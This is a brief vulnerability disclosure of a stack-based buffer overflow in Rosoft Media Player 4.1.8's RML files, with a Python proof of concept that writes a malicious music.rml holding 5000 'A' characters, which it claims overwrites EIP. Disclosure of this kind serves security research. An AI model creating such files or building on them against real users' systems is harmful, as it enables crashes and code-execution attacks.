Subject: Rosoft Media Player 4.1.8 RML Stack Based Buffer Overflow

Description:
This is nothing special - there is just flaw in Rosoft Media Player 4.1.8, similar to one discovered by Juan Pablo Lopez Yacubian. 
This one concerns RML file. This is Stack Based Buffer Overflow vulerability - we can ovewrite EIP. I hope that it was not reported before.

POC:

#!/usr/bin/python

content = (
"#EXTINF:Played=0\n" + "A" * 5000 + "\n"
)

fd = open("music.rml","w");
fd.write(content)
fd.close();

print "RML FILE CREATED"
